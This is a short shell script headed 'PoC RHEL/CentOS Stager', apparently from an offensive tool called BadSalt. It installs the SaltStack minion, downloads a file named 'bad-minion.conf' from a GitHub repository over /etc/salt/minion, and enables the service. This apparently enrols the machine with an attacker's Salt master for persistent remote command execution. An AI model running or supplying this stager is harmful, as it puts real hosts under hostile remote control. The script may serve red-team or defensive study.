# PoC RHEL/CentOS Stager
sudo yum install https://repo.saltstack.com/yum/redhat/salt-repo-latest.el7.noarch.rpm
sudo yum install salt-minion
# Replace with your conf, this is the default
sudo curl https://raw.githubusercontent.com/3ndG4me/BadSalt/master/bad-minion.conf -o /etc/salt/minion
sudo systemctl enable salt-minion --now
